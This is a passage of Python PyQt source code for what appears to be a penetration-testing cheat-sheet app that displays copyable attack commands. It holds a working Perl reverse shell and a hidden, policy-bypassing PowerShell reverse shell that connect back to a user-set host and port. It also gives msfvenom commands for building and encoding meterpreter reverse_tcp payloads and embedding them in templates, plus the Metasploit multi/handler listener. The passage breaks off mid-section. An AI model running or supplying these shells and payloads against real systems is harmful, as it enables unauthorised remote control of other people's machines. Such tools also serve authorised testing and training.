        if hasattr(self, 'netcat_Scan1_Copy'):
            self.tab6_container_layout.removeWidget(self.netcat_Scan1_Copy)
            self.netcat_Scan1_Copy.deleteLater()
        self.netcat_Scan1_Copy = QPushButton()
        self.netcat_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.netcat_Scan1_Copy.setFixedSize(QSize(20,20))
        self.netcat_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.netcat_Scan1.text()))
        self.netcat_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # netcat_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.netcat_Scan1_Copy)
        label_layout.addWidget(self.netcat_Scan1)
        self.tab6_container_layout.insertLayout(20, label_layout)
        
        self.tab6_container_layout.addStretch()

        # netcat_divider 1
        if hasattr(self, 'netcat_divider1'):
            self.tab6_container_layout.removeWidget(self.netcat_divider1)
            self.netcat_divider1.deleteLater()
        self.netcat_divider1 = QFrame()
        self.netcat_divider1.setFrameShape(QFrame.HLine)
        self.netcat_divider1.setLineWidth(3)
        self.netcat_divider1.setStyleSheet("color: #20C20E;")
        
        # netcat_divider2
        if hasattr(self, 'netcat_divider2'):
            self.tab6_container_layout.removeWidget(self.netcat_divider2)
            self.netcat_divider2.deleteLater()
        self.netcat_divider2 = QFrame()
        self.netcat_divider2.setFrameShape(QFrame.HLine)
        self.netcat_divider2.setLineWidth(3)
        self.netcat_divider2.setStyleSheet("color: #20C20E;")
        
        # netcat_spacer1
        if hasattr(self, 'netcat_spacer1'):
            self.tab6_container_layout.removeWidget(self.netcat_spacer1)
            self.netcat_spacer1.deleteLater()
        self.netcat_spacer1 = QLabel()
        self.netcat_spacer1.setFixedWidth(40)
        self.netcat_spacer1.setFixedHeight(50)
        
        # netcat_spacer2
        if hasattr(self, 'netcat_spacer2'):
            self.tab6_container_layout.removeWidget(self.netcat_spacer2)
            self.netcat_spacer2.deleteLater()
        self.netcat_spacer2 = QLabel()
        self.netcat_spacer2.setFixedWidth(40)
        self.netcat_spacer2.setFixedHeight(50)

        # netcat_spacer & divider layout
        self.tab6_container_layout.insertWidget(21, self.netcat_spacer1)
        self.tab6_container_layout.insertWidget(22, self.netcat_divider1)
        self.tab6_container_layout.insertWidget(23, self.netcat_divider2)
        self.tab6_container_layout.insertWidget(24, self.netcat_spacer2)
        self.tab6_container_layout.addStretch()  

# perl
        if hasattr(self, 'perl'):
            self.tab6_container_layout.removeWidget(self.perl)
            self.perl.deleteLater()
        self.perl = QLabel("[+ Perl]")
        self.perl.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab6_container_layout.insertWidget(25,self.perl)

        # perl_Scan1
        if hasattr(self, 'perl_Scan1'):
            self.tab6_container_layout.removeWidget(self.perl_Scan1)
            self.perl_Scan1.deleteLater()
        self.perl_Scan1 = QLabel("perl -e 'use Socket;$i=\"" + self.lhost + "\";$p=" + self.lport + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))\{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");\};'")
        self.perl_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # perl_Scan1 copy button
        if hasattr(self, 'perl_Scan1_Copy'):
            self.tab6_container_layout.removeWidget(self.perl_Scan1_Copy)
            self.perl_Scan1_Copy.deleteLater()
        self.perl_Scan1_Copy = QPushButton()
        self.perl_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.perl_Scan1_Copy.setFixedSize(QSize(20,20))
        self.perl_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.perl_Scan1.text()))
        self.perl_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # perl_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.perl_Scan1_Copy)
        label_layout.addWidget(self.perl_Scan1)
        self.tab6_container_layout.insertLayout(26, label_layout)
        self.tab6_container_layout.addStretch()

        # perl_divider 1
        if hasattr(self, 'perl_divider1'):
            self.tab6_container_layout.removeWidget(self.perl_divider1)
            self.perl_divider1.deleteLater()
        self.perl_divider1 = QFrame()
        self.perl_divider1.setFrameShape(QFrame.HLine)
        self.perl_divider1.setLineWidth(3)
        self.perl_divider1.setStyleSheet("color: #20C20E;")
        
        # perl_divider2
        if hasattr(self, 'perl_divider2'):
            self.tab6_container_layout.removeWidget(self.perl_divider2)
            self.perl_divider2.deleteLater()
        self.perl_divider2 = QFrame()
        self.perl_divider2.setFrameShape(QFrame.HLine)
        self.perl_divider2.setLineWidth(3)
        self.perl_divider2.setStyleSheet("color: #20C20E;")
        
        # perl_spacer1
        if hasattr(self, 'perl_spacer1'):
            self.tab6_container_layout.removeWidget(self.perl_spacer1)
            self.perl_spacer1.deleteLater()
        self.perl_spacer1 = QLabel()
        self.perl_spacer1.setFixedWidth(40)
        self.perl_spacer1.setFixedHeight(50)
        
        # perl_spacer2
        if hasattr(self, 'perl_spacer2'):
            self.tab6_container_layout.removeWidget(self.perl_spacer2)
            self.perl_spacer2.deleteLater()
        self.perl_spacer2 = QLabel()
        self.perl_spacer2.setFixedWidth(40)
        self.perl_spacer2.setFixedHeight(50)

        # perl_spacer & divider layout
        self.tab6_container_layout.insertWidget(27, self.perl_spacer1)
        self.tab6_container_layout.insertWidget(28, self.perl_divider1)
        self.tab6_container_layout.insertWidget(29, self.perl_divider2)
        self.tab6_container_layout.insertWidget(30, self.perl_spacer2)
        self.tab6_container_layout.addStretch()
        
# ps
        if hasattr(self, 'ps'):
            self.tab6_container_layout.removeWidget(self.ps)
            self.ps.deleteLater()
        self.ps = QLabel("[+ Powershell]")
        self.ps.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab6_container_layout.insertWidget(31,self.ps)

        # ps_Scan1
        if hasattr(self, 'ps_Scan1'):
            self.tab6_container_layout.removeWidget(self.ps_Scan1)
            self.ps_Scan1.deleteLater()
        self.ps_Scan1 = QLabel("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"" + self.lhost + "," + self.lport + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
        self.ps_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # ps_Scan1 copy button
        if hasattr(self, 'ps_Scan1_Copy'):
            self.tab6_container_layout.removeWidget(self.ps_Scan1_Copy)
            self.ps_Scan1_Copy.deleteLater()
        self.ps_Scan1_Copy = QPushButton()
        self.ps_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.ps_Scan1_Copy.setFixedSize(QSize(20,20))
        self.ps_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.ps_Scan1.text()))
        self.ps_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # ps_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.ps_Scan1_Copy)
        label_layout.addWidget(self.ps_Scan1)
        self.tab6_container_layout.insertLayout(32, label_layout)
        self.tab6_container_layout.addStretch()
        
        # ps_divider 1
        if hasattr(self, 'ps_divider1'):
            self.tab6_container_layout.removeWidget(self.ps_divider1)
            self.ps_divider1.deleteLater()
        self.ps_divider1 = QFrame()
        self.ps_divider1.setFrameShape(QFrame.HLine)
        self.ps_divider1.setLineWidth(3)
        self.ps_divider1.setStyleSheet("color: #20C20E;")
        
        # ps_divider2
        if hasattr(self, 'ps_divider2'):
            self.tab6_container_layout.removeWidget(self.ps_divider2)
            self.ps_divider2.deleteLater()
        self.ps_divider2 = QFrame()
        self.ps_divider2.setFrameShape(QFrame.HLine)
        self.ps_divider2.setLineWidth(3)
        self.ps_divider2.setStyleSheet("color: #20C20E;")
        
        # ps_spacer1
        if hasattr(self, 'ps_spacer1'):
            self.tab6_container_layout.removeWidget(self.ps_spacer1)
            self.ps_spacer1.deleteLater()
        self.ps_spacer1 = QLabel()
        self.ps_spacer1.setFixedWidth(40)
        self.ps_spacer1.setFixedHeight(50)
        
        # ps_spacer2
        if hasattr(self, 'ps_spacer2'):
            self.tab6_container_layout.removeWidget(self.ps_spacer2)
            self.ps_spacer2.deleteLater()
        self.ps_spacer2 = QLabel()
        self.ps_spacer2.setFixedWidth(40)
        self.ps_spacer2.setFixedHeight(50)

        # ps_spacer & divider layout
        self.tab6_container_layout.insertWidget(33, self.ps_spacer1)
        self.tab6_container_layout.insertWidget(34, self.ps_divider1)
        self.tab6_container_layout.insertWidget(35, self.ps_divider2)
        self.tab6_container_layout.insertWidget(36, self.ps_spacer2)
        self.tab6_container_layout.addStretch()

#### MSFVenom
    def msfvenom(self):
        if not hasattr(self, 'tab7_container'):
            self.tab7_container = QWidget()
            self.tab7_container_layout = QVBoxLayout(self.tab7_container)
            self.tab7_container.setLayout(self.tab7_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.tab7_container)
            self.scroll.setWidgetResizable(True)
            self.tab7_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab7_container_layout.setContentsMargins(0,0,0,0)
            self.tab7_container.adjustSize()
            self.tab7.setLayout(QVBoxLayout())
            self.tab7.layout().addWidget(self.scroll)

        # msfv_top_spacer1
        if hasattr(self, 'msfv_top_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_top_spacer1)
            self.msfv_top_spacer1.deleteLater()
        self.msfv_top_spacer1 = QLabel()
        self.msfv_top_spacer1.setFixedWidth(40)
        self.msfv_top_spacer1.setFixedHeight(50)
     
        # msfv_web_badchar spacer & divider layout
        self.tab7_container_layout.insertWidget(0, self.msfv_top_spacer1)
        self.tab7_container_layout.addStretch()

    # msfv_list
        if hasattr(self, 'msfv_list'):
            self.tab7_container_layout.removeWidget(self.msfv_list)
            self.msfv_list.deleteLater()
        self.msfv_list = QLabel("[+ List Payloads ]")
        self.msfv_list.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(1,self.msfv_list)
     
        # msfv_list_Scan1
        if hasattr(self, 'msfv_list_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_list_Scan1)
            self.msfv_list_Scan1.deleteLater()
        self.msfv_list_Scan1 = QLabel("msfvenom -l payloads")
        self.msfv_list_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(2,self.msfv_list_Scan1)
     
        # msfv_list_Scan1_Copy
        if hasattr(self, 'msfv_list_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_list_Scan1_Copy)
            self.msfv_list_Scan1_Copy.deleteLater()
        self.msfv_list_Scan1_Copy = QPushButton()
        self.msfv_list_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_list_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_list_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_list_Scan1.text()))
        self.msfv_list_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_list_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_list_Scan1_Copy)
        label_layout.addWidget(self.msfv_list_Scan1)
        self.tab7_container_layout.insertLayout(3, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_list_divider1
        if hasattr(self, 'msfv_list_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_list_divider1)
            self.msfv_list_divider1.deleteLater()
        self.msfv_list_divider1 = QFrame()
        self.msfv_list_divider1.setFrameShape(QFrame.HLine)
        self.msfv_list_divider1.setLineWidth(3)
        self.msfv_list_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_list_divider2
        if hasattr(self, 'msfv_list_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_list_divider2)
            self.msfv_list_divider2.deleteLater()
        self.msfv_list_divider2 = QFrame()
        self.msfv_list_divider2.setFrameShape(QFrame.HLine)
        self.msfv_list_divider2.setLineWidth(3)
        self.msfv_list_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_list_spacer1
        if hasattr(self, 'msfv_list_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_list_spacer1)
            self.msfv_list_spacer1.deleteLater()
        self.msfv_list_spacer1 = QLabel()
        self.msfv_list_spacer1.setFixedWidth(40)
        self.msfv_list_spacer1.setFixedHeight(50)
     
        # msfv_list_spacer2
        if hasattr(self, 'msfv_list_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_list_spacer2)
            self.msfv_list_spacer2.deleteLater()
        self.msfv_list_spacer2 = QLabel()
        self.msfv_list_spacer2.setFixedWidth(40)
        self.msfv_list_spacer2.setFixedHeight(50)
     
        # msfv_list spacer & divider layout
        self.tab7_container_layout.insertWidget(4, self.msfv_list_spacer1)
        self.tab7_container_layout.insertWidget(5, self.msfv_list_divider1)
        self.tab7_container_layout.insertWidget(6, self.msfv_list_divider2)
        self.tab7_container_layout.insertWidget(7, self.msfv_list_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_options
        if hasattr(self, 'msfv_options'):
            self.tab7_container_layout.removeWidget(self.msfv_options)
            self.msfv_options.deleteLater()
        self.msfv_options = QLabel("[+ View Payload Options ]")
        self.msfv_options.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(8,self.msfv_options)
     
        # msfv_options_Scan1
        if hasattr(self, 'msfv_options_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_options_Scan1)
            self.msfv_options_Scan1.deleteLater()
        self.msfv_options_Scan1 = QLabel("msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options")
        self.msfv_options_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(9,self.msfv_options_Scan1)
     
        # msfv_options_Scan1_Copy
        if hasattr(self, 'msfv_options_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_options_Scan1_Copy)
            self.msfv_options_Scan1_Copy.deleteLater()
        self.msfv_options_Scan1_Copy = QPushButton()
        self.msfv_options_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_options_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_options_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_options_Scan1.text()))
        self.msfv_options_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_options_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_options_Scan1_Copy)
        label_layout.addWidget(self.msfv_options_Scan1)
        self.tab7_container_layout.insertLayout(10, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_options_divider1
        if hasattr(self, 'msfv_options_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_options_divider1)
            self.msfv_options_divider1.deleteLater()
        self.msfv_options_divider1 = QFrame()
        self.msfv_options_divider1.setFrameShape(QFrame.HLine)
        self.msfv_options_divider1.setLineWidth(3)
        self.msfv_options_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_options_divider2
        if hasattr(self, 'msfv_options_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_options_divider2)
            self.msfv_options_divider2.deleteLater()
        self.msfv_options_divider2 = QFrame()
        self.msfv_options_divider2.setFrameShape(QFrame.HLine)
        self.msfv_options_divider2.setLineWidth(3)
        self.msfv_options_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_options_spacer1
        if hasattr(self, 'msfv_options_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_options_spacer1)
            self.msfv_options_spacer1.deleteLater()
        self.msfv_options_spacer1 = QLabel()
        self.msfv_options_spacer1.setFixedWidth(40)
        self.msfv_options_spacer1.setFixedHeight(50)
     
        # msfv_options_spacer2
        if hasattr(self, 'msfv_options_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_options_spacer2)
            self.msfv_options_spacer2.deleteLater()
        self.msfv_options_spacer2 = QLabel()
        self.msfv_options_spacer2.setFixedWidth(40)
        self.msfv_options_spacer2.setFixedHeight(50)
     
        # msfv_options spacer & divider layout
        self.tab7_container_layout.insertWidget(11, self.msfv_options_spacer1)
        self.tab7_container_layout.insertWidget(12, self.msfv_options_divider1)
        self.tab7_container_layout.insertWidget(13, self.msfv_options_divider2)
        self.tab7_container_layout.insertWidget(14, self.msfv_options_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_basic
        if hasattr(self, 'msfv_basic'):
            self.tab7_container_layout.removeWidget(self.msfv_basic)
            self.msfv_basic.deleteLater()
        self.msfv_basic = QLabel("[+ Creating a Payload ]")
        self.msfv_basic.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(15,self.msfv_basic)
     
        # msfv_basic_Scan1
        if hasattr(self, 'msfv_basic_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_basic_Scan1)
            self.msfv_basic_Scan1.deleteLater()
        self.msfv_basic_Scan1 = QLabel("msfvenom -p [payload] LHOST=" + self.lhost + " LPORT=" + self.lport + "")
        self.msfv_basic_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(16,self.msfv_basic_Scan1)
     
        # msfv_basic_Scan1_Copy
        if hasattr(self, 'msfv_basic_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_basic_Scan1_Copy)
            self.msfv_basic_Scan1_Copy.deleteLater()
        self.msfv_basic_Scan1_Copy = QPushButton()
        self.msfv_basic_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_basic_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_basic_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_basic_Scan1.text()))
        self.msfv_basic_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_basic_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_basic_Scan1_Copy)
        label_layout.addWidget(self.msfv_basic_Scan1)
        self.tab7_container_layout.insertLayout(17, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_basic_divider1
        if hasattr(self, 'msfv_basic_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_basic_divider1)
            self.msfv_basic_divider1.deleteLater()
        self.msfv_basic_divider1 = QFrame()
        self.msfv_basic_divider1.setFrameShape(QFrame.HLine)
        self.msfv_basic_divider1.setLineWidth(3)
        self.msfv_basic_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_basic_divider2
        if hasattr(self, 'msfv_basic_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_basic_divider2)
            self.msfv_basic_divider2.deleteLater()
        self.msfv_basic_divider2 = QFrame()
        self.msfv_basic_divider2.setFrameShape(QFrame.HLine)
        self.msfv_basic_divider2.setLineWidth(3)
        self.msfv_basic_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_basic_spacer1
        if hasattr(self, 'msfv_basic_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_basic_spacer1)
            self.msfv_basic_spacer1.deleteLater()
        self.msfv_basic_spacer1 = QLabel()
        self.msfv_basic_spacer1.setFixedWidth(40)
        self.msfv_basic_spacer1.setFixedHeight(50)
     
        # msfv_basic_spacer2
        if hasattr(self, 'msfv_basic_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_basic_spacer2)
            self.msfv_basic_spacer2.deleteLater()
        self.msfv_basic_spacer2 = QLabel()
        self.msfv_basic_spacer2.setFixedWidth(40)
        self.msfv_basic_spacer2.setFixedHeight(50)
     
        # msfv_basic spacer & divider layout
        self.tab7_container_layout.insertWidget(18, self.msfv_basic_spacer1)
        self.tab7_container_layout.insertWidget(19, self.msfv_basic_divider1)
        self.tab7_container_layout.insertWidget(20, self.msfv_basic_divider2)
        self.tab7_container_layout.insertWidget(21, self.msfv_basic_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_encode
        if hasattr(self, 'msfv_encode'):
            self.tab7_container_layout.removeWidget(self.msfv_encode)
            self.msfv_encode.deleteLater()
        self.msfv_encode = QLabel("[+ Creating a payload with encoding ]")
        self.msfv_encode.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(22,self.msfv_encode)
     
        # msfv_encode_Scan1
        if hasattr(self, 'msfv_encode_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_encode_Scan1)
            self.msfv_encode_Scan1.deleteLater()
        self.msfv_encode_Scan1 = QLabel("msfvenom -p [payload] -e [encoder] -f [formattype] -i [iteration] <var=value> > outputfile")
        self.msfv_encode_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(23,self.msfv_encode_Scan1)
     
        # msfv_encode_Scan1_Copy
        if hasattr(self, 'msfv_encode_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_encode_Scan1_Copy)
            self.msfv_encode_Scan1_Copy.deleteLater()
        self.msfv_encode_Scan1_Copy = QPushButton()
        self.msfv_encode_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_encode_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_encode_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_encode_Scan1.text()))
        self.msfv_encode_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_encode_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_encode_Scan1_Copy)
        label_layout.addWidget(self.msfv_encode_Scan1)
        self.tab7_container_layout.insertLayout(24, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_encode_divider1
        if hasattr(self, 'msfv_encode_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_encode_divider1)
            self.msfv_encode_divider1.deleteLater()
        self.msfv_encode_divider1 = QFrame()
        self.msfv_encode_divider1.setFrameShape(QFrame.HLine)
        self.msfv_encode_divider1.setLineWidth(3)
        self.msfv_encode_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_encode_divider2
        if hasattr(self, 'msfv_encode_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_encode_divider2)
            self.msfv_encode_divider2.deleteLater()
        self.msfv_encode_divider2 = QFrame()
        self.msfv_encode_divider2.setFrameShape(QFrame.HLine)
        self.msfv_encode_divider2.setLineWidth(3)
        self.msfv_encode_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_encode_spacer1
        if hasattr(self, 'msfv_encode_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_encode_spacer1)
            self.msfv_encode_spacer1.deleteLater()
        self.msfv_encode_spacer1 = QLabel()
        self.msfv_encode_spacer1.setFixedWidth(40)
        self.msfv_encode_spacer1.setFixedHeight(50)
     
        # msfv_encode_spacer2
        if hasattr(self, 'msfv_encode_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_encode_spacer2)
            self.msfv_encode_spacer2.deleteLater()
        self.msfv_encode_spacer2 = QLabel()
        self.msfv_encode_spacer2.setFixedWidth(40)
        self.msfv_encode_spacer2.setFixedHeight(50)
     
        # msfv_encode spacer & divider layout
        self.tab7_container_layout.insertWidget(25, self.msfv_encode_spacer1)
        self.tab7_container_layout.insertWidget(26, self.msfv_encode_divider1)
        self.tab7_container_layout.insertWidget(27, self.msfv_encode_divider2)
        self.tab7_container_layout.insertWidget(28, self.msfv_encode_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_template
        if hasattr(self, 'msfv_template'):
            self.tab7_container_layout.removeWidget(self.msfv_template)
            self.msfv_template.deleteLater()
        self.msfv_template = QLabel("[+ Creating a payload using a template ]")
        self.msfv_template.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(29,self.msfv_template)
     
        # msfv_template_Scan1
        if hasattr(self, 'msfv_template_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_template_Scan1)
            self.msfv_template_Scan1.deleteLater()
        self.msfv_template_Scan1 = QLabel("msfvenom -p [payload] <var=value> -x [template] -f [formattype] > outputfile")
        self.msfv_template_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(30,self.msfv_template_Scan1)
     
        # msfv_template_Scan1_Copy
        if hasattr(self, 'msfv_template_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_template_Scan1_Copy)
            self.msfv_template_Scan1_Copy.deleteLater()
        self.msfv_template_Scan1_Copy = QPushButton()
        self.msfv_template_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_template_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_template_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_template_Scan1.text()))
        self.msfv_template_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_template_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.msfv_template_Scan1_Copy)
        label_layout.addWidget(self.msfv_template_Scan1)
        self.tab7_container_layout.insertLayout(31, label_layout)
        self.tab7_container_layout.addStretch()
     
        # msfv_template_divider1
        if hasattr(self, 'msfv_template_divider1'):
            self.tab7_container_layout.removeWidget(self.msfv_template_divider1)
            self.msfv_template_divider1.deleteLater()
        self.msfv_template_divider1 = QFrame()
        self.msfv_template_divider1.setFrameShape(QFrame.HLine)
        self.msfv_template_divider1.setLineWidth(3)
        self.msfv_template_divider1.setStyleSheet("color: #20C20E;")
     
        # msfv_template_divider2
        if hasattr(self, 'msfv_template_divider2'):
            self.tab7_container_layout.removeWidget(self.msfv_template_divider2)
            self.msfv_template_divider2.deleteLater()
        self.msfv_template_divider2 = QFrame()
        self.msfv_template_divider2.setFrameShape(QFrame.HLine)
        self.msfv_template_divider2.setLineWidth(3)
        self.msfv_template_divider2.setStyleSheet("color: #20C20E;")
     
        # msfv_template_spacer1
        if hasattr(self, 'msfv_template_spacer1'):
            self.tab7_container_layout.removeWidget(self.msfv_template_spacer1)
            self.msfv_template_spacer1.deleteLater()
        self.msfv_template_spacer1 = QLabel()
        self.msfv_template_spacer1.setFixedWidth(40)
        self.msfv_template_spacer1.setFixedHeight(50)
     
        # msfv_template_spacer2
        if hasattr(self, 'msfv_template_spacer2'):
            self.tab7_container_layout.removeWidget(self.msfv_template_spacer2)
            self.msfv_template_spacer2.deleteLater()
        self.msfv_template_spacer2 = QLabel()
        self.msfv_template_spacer2.setFixedWidth(40)
        self.msfv_template_spacer2.setFixedHeight(50)
     
        # msfv_template spacer & divider layout
        self.tab7_container_layout.insertWidget(32, self.msfv_template_spacer1)
        self.tab7_container_layout.insertWidget(33, self.msfv_template_divider1)
        self.tab7_container_layout.insertWidget(34, self.msfv_template_divider2)
        self.tab7_container_layout.insertWidget(35, self.msfv_template_spacer2)
        self.tab7_container_layout.addStretch()
     
    # msfv_listener
        if hasattr(self, 'msfv_listener'):
            self.tab7_container_layout.removeWidget(self.msfv_listener)
            self.msfv_listener.deleteLater()
        self.msfv_listener = QLabel("[+ Listening for MSfvenom Payloads (from msframework) ]")
        self.msfv_listener.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(36,self.msfv_listener)
     
        # msfv_listener_Scan1
        if hasattr(self, 'msfv_listener_Scan1'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan1)
            self.msfv_listener_Scan1.deleteLater()
        self.msfv_listener_Scan1 = QLabel("use exploit/multi/handler")
        self.msfv_listener_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab7_container_layout.insertWidget(37,self.msfv_listener_Scan1)
     
        # msfv_listener_Scan1_Copy
        if hasattr(self, 'msfv_listener_Scan1_Copy'):
            self.tab7_container_layout.removeWidget(self.msfv_listener_Scan1_Copy)
            self.msfv_listener_Scan1_Copy.deleteLater()
        self.msfv_listener_Scan1_Copy = QPushButton()
        self.msfv_listener_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.msfv_listener_Scan1_Copy.setFixedSize(QSize(20,20))
        self.msfv_listener_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.msfv_listener_Scan1.text()))
        self.msfv_listener_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20E';}"
        )
     
        # msfv_listener_Scan1 adding Widgets
